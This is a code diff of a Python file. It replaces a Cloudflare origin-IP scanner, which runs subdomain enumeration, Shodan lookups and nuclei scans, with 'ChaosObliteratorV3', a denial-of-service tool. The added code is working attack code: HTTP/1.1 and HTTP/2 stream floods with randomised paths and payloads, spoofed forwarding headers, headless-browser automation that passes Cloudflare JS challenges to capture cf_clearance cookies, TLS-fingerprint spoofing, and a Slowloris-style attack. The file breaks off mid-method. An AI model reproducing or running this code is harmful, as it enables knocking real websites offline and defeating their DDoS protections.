@@ -1,584 +1,358 @@
-import asyncio
-import aiohttp
-import aiodns
+import threading
 import socket
-import ipaddress
-import argparse
-import logging
-import json
-import csv
-from pathlib import Path
-from typing import List, Tuple, Dict, Set
 import random
 import string
-import subprocess
-import ssl
-import sys
-from urllib.parse import urlencode
-from datetime import datetime
-from shodan import Shodan
-import pickle
-from dataclasses import dataclass
+import time
+import argparse
+import logging
+import os
+import hashlib
+import xxhash
+import h2.connection
+import h2.events
+from typing import List
+from playwright.sync_api import sync_playwright, Playwright
+import tls_client
+import undetected_chromedriver as uc
+import requests
+from requests.cookies import RequestsCookieJar
 
-# Setup logging
+# Logging Setup
 logging.basicConfig(
-    filename=f'bypass_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
     level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
+    format="%(asctime)s - [%(levelname)s] %(message)s",
+    handlers=[logging.FileHandler("chaos_obliterator_v3.log"), logging.StreamHandler()]
 )
 
-# Konfigurasi CDN dan User-Agent
-CDN_IP_RANGES = {
-    "Cloudflare": ["173.245.48.0/20", "103.21.244.0/22", "104.16.0.0/13"],
-    "Akamai": ["23.32.0.0/11", "23.192.0.0/11"]
-}
-CDN_ORG_NAMES = {
-    "Cloudflare": ["CLOUDFLARE", "CLOUDFLARENET"],
-    "Akamai": ["AKAMAI", "AKAMAI TECHNOLOGIES"],
-    "Amazon": ["AMAZON", "AWS"]
-}
-CDN_HEADER_SIGNATURES = {
-    "Cloudflare": ["cf-ray", "cf-cache-status"],
-    "Akamai": ["akamai-grn", "x-akamai-transformed"],
-    "Amazon": ["x-amz-cf-id", "x-amz-cf-pop"]
-}
+class ChaosObliteratorV3:
+    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, methods: List[str] = None):
+        self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
+        self.target_l4 = target_l4 if target_l4 else None
+        self.duration = duration
+        self.threads = min(threads, 60)  # Replit-optimized
+        self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator"]
+        self.end_time = time.time() + duration
+        self.user_agents = [
+            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)}",
+            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) Safari/605.1.{random.randint(40, 50)}"
+        ]
+        self.success_count = {m: 0 for m in self.methods}
+        self.response_times = {m: [] for m in ["chaoshttp", "ghostloris"]}
+        self.lock = threading.Lock()
+        self.active_ports = [80, 443, 53, 123, 161, 389, 445, 1433, 1900, 5060, 11211, 1812, 5353, 3478, 6881, 17185, 27015, 4433]
+        self.jitter_factors = {i: 1.0 for i in range(self.threads)}  # Per-thread jitter
+        self.cookies = RequestsCookieJar()  # Upgraded to RequestsCookieJar
+        self.session_headers = {}  # Store headers from browser
 
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.1.1 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
-]
+    def _random_payload(self, size: int = 512) -> bytes:
+        """Upgraded polymorphic payload with larger size."""
+        seed = f"{random.randint(10000000000000000, 99999999999999999)}{time.time_ns()}{os.urandom(15).hex()}".encode()
+        hash1 = xxhash.xxh3_128(seed).digest()
+        hash2 = hashlib.sha3_512(hash1 + os.urandom(13)).digest()
+        hash3 = xxhash.xxh64(hash2 + os.urandom(11)).digest()
+        hash4 = hashlib.blake2b(hash3 + os.urandom(9), digest_size=32).digest()
+        return (hash4 + hash3 + hash2 + os.urandom(1))[:size]
 
-RANDOM_SUBDOMAINS = [''.join(random.choices(string.ascii_lowercase + string.digits, k=15)) for _ in range(5)]
+    def _random_path(self) -> str:
+        """Dynamic obfuscated URL paths."""
+        prefixes = ["v13", "chaos", "obliterator", "nexus", "vortex"]
+        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(45, 60))) for _ in range(random.randint(12, 15))]
+        query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=52))}&epoch={random.randint(100000000000000, 999999999999999)}"
+        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"
 
-def is_valid_domain(domain: str) -> bool:
-    import re
-    pattern = r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
-    return bool(re.match(pattern, domain))
+    def _random_ip(self) -> str:
+        """Spoofed IP for headers."""
+        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
 
-def is_private_ip(ip: str) -> bool:
-    try:
-        ip_addr = ipaddress.ip_address(ip)
-        return ip_addr.is_private
-    except ValueError:
-        return False
-
-def is_cdn_ip(ip: str, asn_info: Dict) -> Tuple[bool, str]:
-    try:
-        ip_addr = ipaddress.ip_address(ip)
-        for cdn, ranges in CDN_IP_RANGES.items():
-            for cidr in ranges:
-                if ip_addr in ipaddress.ip_network(cidr):
-                    return True, cdn
-        org = asn_info.get("org", "").upper()
-        for cdn, org_names in CDN_ORG_NAMES.items():
-            if any(name in org for name in org_names):
-                return True, cdn
-        return False, ""
-    except ValueError:
-        return False, ""
-
-@dataclass
-class ScanResult:
-    subdomain: str
-    ip: str
-    dns_records: Dict
-    cdn: Dict
-    asn: Dict
-    http: Dict
-    nuclei_findings: List[Dict]
-
-class CacheManager:
-    def __init__(self, cache_file: str = "scan_cache.pkl"):
-        self.cache_file = cache_file
-        self.cache = self.load_cache()
-
-    def load_cache(self) -> Dict:
-        if Path(self.cache_file).exists():
-            with open(self.cache_file, "rb") as f:
-                return pickle.load(f)
-        return {"dns": {}, "http": {}}
-
-    def save_cache(self):
-        with open(self.cache_file, "wb") as f:
-            pickle.dump(self.cache, f)
-
-    def get_dns(self, subdomain: str) -> Dict:
-        return self.cache["dns"].get(subdomain, {})
-
-    def set_dns(self, subdomain: str, data: Dict):
-        self.cache["dns"][subdomain] = data
-        self.save_cache()
-
-    def get_http(self, ip: str, port: int) -> Dict:
-        return self.cache["http"].get(f"{ip}:{port}", {})
-
-    def set_http(self, ip: str, port: int, data: Dict):
-        self.cache["http"][f"{ip}:{port}"] = data
-        self.save_cache()
-
-class DNSScanner:
-    def __init__(self, domain: str, resolver_path: str = "resolvers.txt"):
-        self.domain = domain
-        self.resolver_path = resolver_path
-        self.resolver = aiodns.DNSResolver()
-        self.semaphore = asyncio.Semaphore(100)
-        self.cache = CacheManager()
-
-    async def detect_wildcard(self) -> Tuple[bool, Set[str]]:
-        wildcard_ips = set()
-        for random_sub in RANDOM_SUBDOMAINS:
-            try:
-                result = await self.resolver.gethostbyname(f"{random_sub}.{self.domain}", socket.AF_INET)
-                wildcard_ips.update(result.addresses)
-            except:
-                continue
-        return bool(wildcard_ips), wildcard_ips
-
-    def run_amass(self, wordlist_path: str) -> List[str]:
-        try:
-            output_file = f"amass_{self.domain}.txt"
-            cmd = ["amass", "enum", "-d", self.domain, "-brute", "-w", wordlist_path, "-o", output_file, "-passive"]
-            subprocess.run(cmd, check=True, timeout=1800)
-            with open(output_file, "r") as f:
-                return [line.strip() for line in f if line.strip()]
-        except Exception as e:
-            logging.error(f"Amass failed: {e}")
-            return []
-
-    def run_massdns(self, wordlist_path: str) -> List[Dict]:
-        try:
-            output_file = f"massdns_{self.domain}.txt"
-            cmd = ["massdns", "-r", self.resolver_path, "-t", "A", "-o", "S", "-w", output_file, wordlist_path]
-            subprocess.run(cmd, check=True, timeout=600)
-            results = []
-            with open(output_file, "r") as f:
-                for line in f:
-                    if " A " in line:
-                        subdomain, _, ip = line.strip().split()
-                        results.append({"subdomain": subdomain.rstrip("."), "ip": ip})
-            return results
-        except Exception as e:
-            logging.error(f"MassDNS failed: {e}")
-            return []
-
-    def run_dnsx(self, subdomains: List[str]) -> List[str]:
-        try:
-            input_file = f"dnsx_input_{self.domain}.txt"
-            output_file = f"dnsx_{self.domain}.txt"
-            with open(input_file, "w") as f:
-                f.write("\n".join(subdomains))
-            cmd = ["dnsx", "-wd", self.domain, "-l", input_file, "-o", output_file]
-            subprocess.run(cmd, check=True, timeout=300)
-            with open(output_file, "r") as f:
-                return [line.strip() for line in f if line.strip()]
-        except Exception as e:
-            logging.error(f"dnsx failed: {e}")
-            return []
-
-    async def resolve_dns(self, subdomain: str, record_types: List[str] = ["A", "AAAA", "CNAME"]) -> Dict:
-        cached = self.cache.get_dns(subdomain)
-        if cached:
-            return cached
-        async with self.semaphore:
-            results = {}
-            for rtype in record_types:
-                try:
-                    if rtype == "CNAME":
-                        answers = await self.resolver.query(subdomain, rtype)
-                        results[rtype] = [str(ans.host) for ans in answers]
-                    else:
-                        result = await self.resolver.gethostbyname(subdomain, socket.AF_INET if rtype == "A" else socket.AF_INET6)
-                        results[rtype] = result.addresses
-                except Exception as e:
-                    results[rtype] = []
-                    logging.debug(f"Failed to resolve {subdomain} ({rtype}): {e}")
-            self.cache.set_dns(subdomain, results)
-            return results
-
-class HTTPScanner:
-    def __init__(self):
-        self.cache = CacheManager()
-
-    def get_random_headers(self) -> Dict:
+    def _random_headers(self) -> dict:
+        """Upgraded WAF-evading headers with cookie injection."""
         headers = {
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": random.choice(["text/html,application/xhtml+xml", "application/json"]),
-            "Accept-Language": random.choice(["en-US,en;q=0.5", "id-ID,id;q=0.9"]),
-            "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+            "User-Agent": random.choice(self.user_agents),
+            "X-Forwarded-For": self._random_ip(),
+            "Accept": random.choice(["application/json", "text/event-stream", "*/*", "application/x-graphql"]),
+            "Cache-Control": "no-cache, no-store, must-revalidate",
+            "Connection": "keep-alive"
         }
-        if random.random() > 0.3:
-            headers["Referer"] = f"https://{''.join(random.choices(string.ascii_lowercase, k=10))}.com"
-        if random.random() > 0.4:
-            headers["Cookie"] = f"session={''.join(random.choices(string.ascii_letters + string.digits, k=20))}"
+        headers.update(self.session_headers)  # Inject headers from browser
+        if random.random() < 0.99:
+            headers["X-Entropy-Nexus"] = ''.join(random.choices(string.hexdigits.lower(), k=60))
         return headers
 
-    async def fingerprint(self, ip: str, port: int, session: aiohttp.ClientSession, use_tls_fingerprint: bool = False, proxy: str = None, max_retries: int = 2) -> Dict:
-        cached = self.cache.get_http(ip, port)
-        if cached:
-            return cached
-        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
-        if random.random() > 0.5:
-            url += "?" + urlencode({f"q{random.randint(1, 100)}": random.randint(1, 1000)})
-        
-        result = {
-            "port": port,
-            "status": None,
-            "headers": {},
-            "title": "-",
-            "final_url": "-",
-            "tls_fingerprint": "-",
-            "http2": False,
-            "cdn_detected": "",
-            "tech_stack": []
-        }
-
-        for attempt in range(max_retries):
+    def _get_browser_session(self):
+        """Use headless browser to bypass JS challenges and get cookies with validation."""
+        max_attempts = 3
+        attempt = 0
+        while attempt < max_attempts:
             try:
-                await asyncio.sleep(random.uniform(0.3, 1.0))
-                headers = self.get_random_headers()
-                if use_tls_fingerprint and port == 443:
-                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    context.set_alpn_protocols(["h2", "http/1.1"])
-                    context.set_ciphers("ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256")
-                    async with session.get(url, headers=headers, ssl=context, proxy=proxy, timeout=8) as resp:
-                        result["status"] = resp.status
-                        result["headers"] = dict(resp.headers)
-                        result["final_url"] = str(resp.url)
-                        result["http2"] = resp.version == (2, 0)
-                        result["tls_fingerprint"] = self.compute_ja3_fingerprint(context)
-                        result["tech_stack"] = self.detect_tech_stack(resp.headers)
-                        if resp.status in [403, 429]:
-                            logging.warning(f"WAF block detected on {ip}:{port} (Status: {resp.status}, Attempt: {attempt+1})")
-                            continue
-                        try:
-                            text = await resp.text()
-                            start = text.lower().find("<title>")
-                            end = text.lower().find("</title>")
-                            if start != -1 and end != -1:
-                                result["title"] = text[start + 7:end].strip()
-                        except:
-                            pass
-                        for cdn, signatures in CDN_HEADER_SIGNATURES.items():
-                            if any(sig in result["headers"] for sig in signatures):
-                                result["cdn_detected"] = cdn
-                                break
-                        break
-                else:
-                    async with session.get(url, headers=headers, proxy=proxy, timeout=8, allow_redirects=True) as resp:
-                        result["status"] = resp.status
-                        result["headers"] = dict(resp.headers)
-                        result["final_url"] = str(resp.url)
-                        result["http2"] = resp.version == (2, 0)
-                        result["tech_stack"] = self.detect_tech_stack(resp.headers)
-                        if resp.status in [403, 429]:
-                            logging.warning(f"WAF block detected on {ip}:{port} (Status: {resp.status}, Attempt: {attempt+1})")
-                            continue
-                        try:
-                            text = await resp.text()
-                            start = text.lower().find("<title>")
-                            end = text.lower().find("</title>")
-                            if start != -1 and end != -1:
-                                result["title"] = text[start + 7:end].strip()
-                        except:
-                            pass
-                        for cdn, signatures in CDN_HEADER_SIGNATURES.items():
-                            if any(sig in result["headers"] for sig in signatures):
-                                result["cdn_detected"] = cdn
-                                break
-                        break
-            except aiohttp.ClientError as e:
-                logging.debug(f"HTTP retry failed for {ip}:{port}: {e}")
-                if attempt == max_retries - 1:
-                    result["status"] = "ERROR"
+                with sync_playwright() as p:
+                    browser = p.chromium.launch(headless=True)
+                    context = browser.new_context(
+                        user_agent=random.choice(self.user_agents),
+                        viewport={"width": 1920, "height": 1080}
+                    )
+                    page = context.new_page()
+                    
+                    # Emulate human behavior
+                    page.goto(f"https://{self.target_l7}", wait_until="domcontentloaded")
+                    time.sleep(random.uniform(1, 3))  # Simulate page load
+                    page.evaluate("window.scrollTo(0, document.body.scrollHeight)")  # Scroll
+                    time.sleep(random.uniform(0.5, 1.5))  # Random delay
+                    page.click("body")  # Random click
+                    time.sleep(random.uniform(0.5, 1.5))
+                    
+                    # Get cookies and validate
+                    cookies = context.cookies()
+                    cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
+                    if not cf_clearance:
+                        logging.warning(f"Attempt {attempt + 1}: No cf_clearance cookie, retrying...")
+                        attempt += 1
+                        browser.close()
+                        continue
+                    
+                    # Store cookies in RequestsCookieJar
+                    for cookie in cookies:
+                        self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
+                    
+                    # Get headers from browser
+                    self.session_headers = {
+                        "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
+                        "Sec-Fetch-Site": "same-origin",
+                        "Sec-Fetch-Mode": "navigate",
+                        "Sec-Fetch-Dest": "document"
+                    }
+                    browser.close()
+                    logging.info("JS challenge passed, cookies obtained.")
+                    return
             except Exception as e:
-                logging.debug(f"HTTP check failed for {ip}:{port}: {e}")
-        self.cache.set_http(ip, port, result)
-        return result
+                logging.error(f"Playwright failed: {e}")
+                attempt += 1
+                if attempt == max_attempts:
+                    logging.warning("Switching to undetected_chromedriver fallback...")
+                    self._get_browser_session_fallback()
+        logging.error("Failed to get valid cookies after max attempts.")
 
-    def compute_ja3_fingerprint(self, context: ssl.SSLContext) -> str:
+    def _get_browser_session_fallback(self):
+        """Fallback to undetected_chromedriver if Playwright fails."""
         try:
-            ciphers = context.get_ciphers()
-            cipher_ids = [str(cipher["id"]) for cipher in ciphers]
-            return f"ja3:771,{'-'.join(cipher_ids[:3])},..."
-        except Exception as e:
-            logging.error(f"JA3 computation failed: {e}")
-            return "ja3:unknown"
-
-    def detect_tech_stack(self, headers: Dict) -> List[str]:
-        tech = []
-        server = headers.get("Server", "").lower()
-        if "nginx" in server:
-            tech.append("Nginx")
-        elif "apache" in server:
-            tech.append("Apache")
-        if "x-powered-by" in headers:
-            tech.append(headers["x-powered-by"])
-        if "x-drupal-cache" in headers:
-            tech.append("Drupal")
-        return tech
-
-    def run_httpx(self, subdomains: List[str], ports: List[int]) -> List[Dict]:
-        try:
-            input_file = f"httpx_input_{random.randint(1000, 9999)}.txt"
-            with open(input_file, "w") as f:
-                f.write("\n".join(subdomains))
-            output_file = f"httpx_{random.randint(1000, 9999)}.json"
-            cmd = [
-                "httpx", "-l", input_file, "-ports", ",".join(map(str, ports)),
-                "-status-code", "-title", "-json", "-o", output_file,
-                "-threads", "50", "-silent"  # Optimasi untuk Colab
-            ]
-            subprocess.run(cmd, check=True, timeout=600)
-            results = []
-            with open(output_file, "r") as f:
-                for line in f:
-                    if line.strip():
-                        data = json.loads(line.strip())
-                        results.append({
-                            "url": data.get("url"),
-                            "status": data.get("status_code"),
-                            "title": data.get("title", "-"),
-                            "port": int(data.get("port", 80))
-                        })
-            return results
-        except Exception as e:
-            logging.error(f"httpx failed: {e}")
-            return []
-
-class ResultProcessor:
-    def __init__(self, domain: str):
-        self.domain = domain
-        self.results: List[ScanResult] = []
-
-    def add_result(self, result: ScanResult):
-        self.results.append(result)
-
-    def filter_results(self) -> List[ScanResult]:
-        filtered = []
-        seen_ips = set()
-        for result in self.results:
-            if (
-                result.http.get("status") in [200, 301]
-                and not result.cdn["is_cdn"]
-                and result.ip not in seen_ips
-            ):
-                filtered.append(result)
-                seen_ips.add(result.ip)
-        return filtered
-
-    def save_results(self, json_file: str, csv_file: str):
-        filtered_results = self.filter_results()
-        with open(json_file, "w") as f:
-            json.dump([r.__dict__ for r in filtered_results], f, indent=2)
-        with open(csv_file, "w", newline="") as f:
-            writer = csv.DictWriter(f, fieldnames=[
-                "subdomain", "ip", "asn", "org", "cdn_name", "port", "status",
-                "server", "title", "final_url", "http2", "tls_fingerprint", "cdn_detected", "tech_stack", "nuclei_findings"
-            ])
-            writer.writeheader()
-            for result in filtered_results:
-                writer.writerow({
-                    "subdomain": result.subdomain,
-                    "ip": result.ip,
-                    "asn": result.asn["asn"],
-                    "org": result.asn["org"],
-                    "cdn_name": result.cdn["name"],
-                    "port": result.http.get("port", "-"),
-                    "status": result.http.get("status", "-"),
-                    "server": result.http.get("headers", {}).get("Server", "-"),
-                    "title": result.http.get("title", "-"),
-                    "final_url": result.http.get("final_url", "-"),
-                    "http2": str(result.http.get("http2", False)),
-                    "tls_fingerprint": result.http.get("tls_fingerprint", "-"),
-                    "cdn_detected": result.http.get("cdn_detected", "-"),
-                    "tech_stack": ",".join(result.http.get("tech_stack", [])),
-                    "nuclei_findings": json.dumps(result.nuclei_findings)
-                })
-
-class Scanner:
-    def __init__(self, domain: str, wordlist_path: str, ports: List[int], proxy_file: str = None, shodan_api: str = None, use_tor: bool = False):
-        self.domain = domain
-        self.wordlist_path = wordlist_path
-        self.ports = ports
-        self.proxy_file = proxy_file
-        self.shodan_api = shodan_api
-        self.use_tor = use_tor
-        self.dns_scanner = DNSScanner(domain)
-        self.http_scanner = HTTPScanner()
-        self.result_processor = ResultProcessor(domain)
-        self.proxies = self.load_proxies() if proxy_file else []
-        if use_tor:
-            tor_proxy = self.setup_tor_proxy()
-            if tor_proxy:
-                self.proxies.append(tor_proxy)
-
-    def load_proxies(self) -> List[str]:
-        if not Path(self.proxy_file).is_file():
-            logging.warning(f"Proxy file '{self.proxy_file}' tidak ditemukan")
-            return []
-        with open(self.proxy_file, "r") as f:
-            return [line.strip() for line in f if line.strip()]
-
-    def setup_tor_proxy(self) -> str:
-        try:
-            subprocess.run(["tor"], capture_output=True, timeout=5)
-            return "socks5://127.0.0.1:9050"
-        except Exception as e:
-            logging.warning(f"Tor setup failed: {e}")
-            return None
-
-    def run_shodan_search(self) -> List[Dict]:
-        if not self.shodan_api:
-            return []
-        try:
-            shodan = Shodan(self.shodan_api)
-            results = shodan.search(f"hostname:{self.domain}", limit=100)
-            subdomains = []
-            for result in results["matches"]:
-                ip = result.get("ip_str")
-                hostnames = result.get("hostnames", [])
-                port = result.get("port")
-                for hostname in hostnames:
-                    subdomains.append({"subdomain": hostname, "ip": ip, "port": port})
-            return subdomains
-        except Exception as e:
-            logging.error(f"Shodan search failed: {e}")
-            return []
-
-    def lookup_asn(self, ip: str) -> Dict:
-        if is_private_ip(ip):
-            return {"asn": "-", "org": "Private IP", "country": "-"}
-        try:
-            from ipwhois import IPWhois
-            obj = IPWhois(ip)
-            results = obj.lookup_rdap()
-            return {
-                "asn": results.get("asn", "-"),
-                "org": results.get("network", {}).get("name", "-"),
-                "country": results.get("network", {}).get("country", "-")
+            driver = uc.Chrome(headless=True, use_subprocess=False)
+            driver.get(f"https://{self.target_l7}")
+            time.sleep(random.uniform(1, 3))  # Simulate page load
+            driver.execute_script("window.scrollTo(0, document.body.scrollHeight)")  # Scroll
+            time.sleep(random.uniform(0.5, 1.5))
+            driver.find_element_by_tag_name("body").click()  # Random click
+            time.sleep(random.uniform(0.5, 1.5))
+            
+            # Get cookies and validate
+            cookies = driver.get_cookies()
+            cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
+            if not cf_clearance:
+                logging.error("Fallback: No cf_clearance cookie.")
+                driver.quit()
+                return
+            
+            # Store cookies in RequestsCookieJar
+            for cookie in cookies:
+                self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
+            
+            # Get headers
+            self.session_headers = {
+                "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Dest": "document"
             }
+            driver.quit()
+            logging.info("Fallback: JS challenge passed, cookies obtained.")
         except Exception as e:
-            logging.error(f"ASN lookup failed for {ip}: {e}")
-            return {"asn": "-", "org": "-", "country": "-"}
+            logging.error(f"Fallback failed: {e}")
 
-    async def run(self, use_tls_fingerprint: bool, use_nuclei: bool):
-        print("⚠️ PERINGATAN: Gunakan skrip ini hanya pada domain yang Anda miliki atau dengan izin eksplisit!")
-        logging.info(f"Starting scan for {self.domain} at {datetime.now().strftime('%H:%M:%S %Z')}")
-
-        # Step 1: Enumerasi subdomain
-        amass_subdomains = self.dns_scanner.run_amass(self.wordlist_path)
-        logging.info(f"Amass found {len(amass_subdomains)} subdomains")
-
-        massdns_results = self.dns_scanner.run_massdns(self.wordlist_path)
-        logging.info(f"MassDNS found {len(massdns_results)} subdomains")
-
-        valid_subdomains = self.dns_scanner.run_dnsx([r["subdomain"] for r in massdns_results] + amass_subdomains)
-        logging.info(f"dnsx filtered {len(valid_subdomains)} valid subdomains")
-
-        shodan_subdomains = self.run_shodan_search()
-        subdomains = list(set(valid_subdomains + [s["subdomain"] for s in shodan_subdomains]))
-        logging.info(f"Total subdomains: {len(subdomains)}")
-
-        # Step 2: HTTP probing
-        httpx_results = self.http_scanner.run_httpx(subdomains, self.ports)
-        logging.info(f"httpx found {len(httpx_results)} live subdomains")
-
-        # Step 3: Fingerprinting dan analisis
-        async with aiohttp.ClientSession() as session:
-            for httpx_result in httpx_results:
-                ip = next((r["ip"] for r in massdns_results if r["subdomain"] in httpx_result["url"]), None)
-                if not ip or is_private_ip(ip):
-                    continue
-                asn_info = self.lookup_asn(ip)
-                is_cdn, cdn_name = is_cdn_ip(ip, asn_info)
-                http_result = await self.http_scanner.fingerprint(
-                    ip, httpx_result["port"], session, use_tls_fingerprint, random.choice(self.proxies) if self.proxies else None
-                )
-                result = ScanResult(
-                    subdomain=httpx_result["url"].split("://")[1].split(":")[0],
-                    ip=ip,
-                    dns_records={"A": [ip]},
-                    cdn={"is_cdn": is_cdn, "name": cdn_name},
-                    asn=asn_info,
-                    http=http_result,
-                    nuclei_findings=[] if not use_nuclei else self.run_nuclei(ip, httpx_result["port"])
-                )
-                self.result_processor.add_result(result)
-
-        # Step 4: Simpan hasil
-        json_file = f"results_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        csv_file = f"results_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
-        self.result_processor.save_results(json_file, csv_file)
-        print(f"Results saved to {json_file} and {csv_file}")
-        logging.info(f"Scan completed at {datetime.now().strftime('%H:%M:%S %Z')}")
-
-    def run_nuclei(self, ip: str, port: int) -> List[Dict]:
-        try:
-            output_file = f"nuclei_{ip}_{port}.jsonl"
-            cmd = [
-                "nuclei", "-u", f"http://{ip}:{port}" if port != 443 else f"https://{ip}",
-                "-t", "cves/", "-t", "technologies/", "-jsonl", "-o", output_file,
-                "-silent", "-c", "10"  # Optimasi untuk Colab
-            ]
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            findings = []
-            with open(output_file, "r") as f:
-                for line in f:
-                    if line.strip():
-                        findings.append(json.loads(line.strip()))
-            return findings
-        except Exception as e:
-            logging.error(f"Nuclei scan failed for {ip}:{port}: {e}")
-            return []
-
-def parse_ports(port_str: str) -> List[int]:
-    ports = []
-    for part in port_str.split(','):
-        if '-' in part:
+    def _scan_ports(self):
+        """Dynamic port scanning for L4 targets."""
+        if not self.target_l4:
+            return
+        new_ports = []
+        for port in [80, 443, 8080, 3389, 1433, 3306, 1723, 445, 1812, 5353, 3478, 6881, 17185, 27015, 4433]:
             try:
-                start, end = map(int, part.split('-'))
-                ports.extend(range(start, end + 1))
-            except ValueError:
-                continue
-        else:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.05)
+                sock.connect((self.target_l4, port))
+                new_ports.append(port)
+                sock.close()
+            except:
+                pass
+        if new_ports:
+            with self.lock:
+                self.active_ports = new_ports
+
+    def _adjust_jitter(self, thread_id: int, response_time: float):
+        """Per-thread adaptive jitter."""
+        with self.lock:
+            if response_time > 100:
+                self.jitter_factors[thread_id] = min(self.jitter_factors[thread_id] * 1.2, 2.0)
+            elif response_time < 50:
+                self.jitter_factors[thread_id] = max(self.jitter_factors[thread_id] * 0.8, 0.5)
+
+    def _chaoshttp(self, thread_id: int):
+        """Upgraded L7: HTTP flood with tls_client and H2 multiplexing."""
+        if not self.target_l7:
+            return
+        session = tls_client.Session(
+            client_identifier=f"chrome_{random.randint(100, 120)}",
+            random_tls_extension_order=True
+        )
+        while time.time() < self.end_time:
+            start_time = time.time()
             try:
-                ports.append(int(part))
-            except ValueError:
-                continue
-    return sorted(list(set(ports)))
+                proto = random.random()
+                if proto < 0.5:  # HTTP/1.1 with browser cookies
+                    headers = self._random_headers()
+                    method = random.choice(["GET", "POST", "PUT"])
+                    path = self._random_path()
+                    url = f"https://{self.target_l7}{path}"
+                    body = self._random_payload(512) if method in ["POST", "PUT"] else None
+                    if method == "GET":
+                        resp = session.get(url, headers=headers)
+                    else:
+                        resp = session.post(url, headers=headers, data=body)
+                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
+                    with self.lock:
+                        self.success_count["chaoshttp"] += 1 if resp.status_code < 400 else 0
+                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
+                else:  # HTTP/2 with multiplexing
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.015)
+                    sock.connect((self.target_l7, 443))
+                    context = ssl._create_unverified_context()
+                    sock = context.wrap_socket(sock, server_hostname=self.target_l7)
+                    h2conn = h2.connection.H2Connection()
+                    h2conn.initiate_connection()
+                    sock.sendall(h2conn.data_to_send())
+                    headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": self._random_path()}
+                    headers.update(self._random_headers())
+                    for stream_id in range(1, 201, 2):  # Up to 100 streams
+                        h2conn.send_headers(stream_id, headers, end_stream=True)
+                        sock.sendall(h2conn.data_to_send())
+                        time.sleep(random.uniform(0.0001, 0.0005) * self.jitter_factors[thread_id])
+                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
+                    with self.lock:
+                        self.success_count["chaoshttp"] += 1
+                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
+                    sock.close()
+                time.sleep(random.uniform(0.0001, 0.0006) * self.jitter_factors[thread_id])
+            except Exception as e:
+                logging.debug(f"ChaosHTTP error: {e}")
 
-def main():
-    parser = argparse.ArgumentParser(description="Ultra-Modular Cloudflare Origin IP Bypass v5.1 - God-Tier")
-    parser.add_argument("domain", help="Target domain (e.g., example.com)")
-    parser.add_argument("wordlist", help="Path to subdomain wordlist file")
-    parser.add_argument("--ports", help="Comma-separated ports or range (e.g., 80,443 or 1-1000)", default="80,443,8080")
-    parser.add_argument("--tls-fingerprint", action="store_true", help="Enable TLS fingerprinting for WAF/CDN bypass")
-    parser.add_argument("--nuclei", action="store_true", help="Enable Nuclei vulnerability scanning")
-    parser.add_argument("--proxy-file", help="Path to proxy list file (one proxy per line)", default=None)
-    parser.add_argument("--shodan-api", help="Shodan API key for passive enumeration", default=None)
-    parser.add_argument("--use-tor", action="store_true", help="Use Tor for proxy rotation")
-    args = parser.parse_args()
+    def _ghostloris(self, thread_id: int):
+        """Upgraded L7: Ghost Slowloris with tls_client."""
+        if not self.target_l7:
+            return
+        session = tls_client.Session(
+            client_identifier=f"chrome_{random.randint(100, 120)}",
+            random_tls_extension_order=True
+        )
+        while time.time() < self.end_time:
+            start_time = time.time()
+            try:
+                headers = {
+                    "User-Agent": random.choice(self.user_agents),
+                    "X-Forwarded-For": self._random_ip(),
+                    "Connection": "keep-alive"
+                }
+                headers.update(self.session_headers)
+                path = self._random_path()
+                url = f"https://{self.target_l7}{path}"
+                # Partial request to simulate Slowloris
+                session.get(url, headers=headers, timeout=0.08)  # Low timeout for slow drip
+                self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
+                with self.lock:
+                    self.success_count["ghostloris"] += 1
+                    self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
+                time.sleep(random.uniform(0.001, 0.006) * self.jitter_factors[thread_id])
